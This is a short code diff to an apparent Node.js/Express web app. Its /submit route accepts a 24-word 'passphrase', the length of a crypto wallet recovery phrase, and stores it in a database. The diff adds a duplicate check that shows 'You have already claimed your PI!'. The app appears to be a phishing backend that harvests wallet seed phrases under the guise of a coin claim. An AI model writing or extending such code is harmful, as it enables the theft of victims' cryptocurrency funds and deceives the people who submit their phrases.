@@ -35,11 +35,25 @@ app.get('/', (req, res) => {
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
+    // Validate passphrase
     if (!passphrase || passphrase.trim().split(" ").length !== 24) {
         return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
     try {
+        // Check if the passphrase already exists
+        const existingPassphrase = await Passphrase.findOne({ passphrase });
+        if (existingPassphrase) {
+            return res.status(200).send(`
+                <div style="background-color: white; padding: 20px; text-align: center;">
+                    <h2 style="font-size: 24px; font-family: Arial, sans-serif; color: #ff0000;">
+                        You have already claimed your PI!
+                    </h2>
+                </div>
+            `);
+        }
+
+        // Save the new passphrase
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
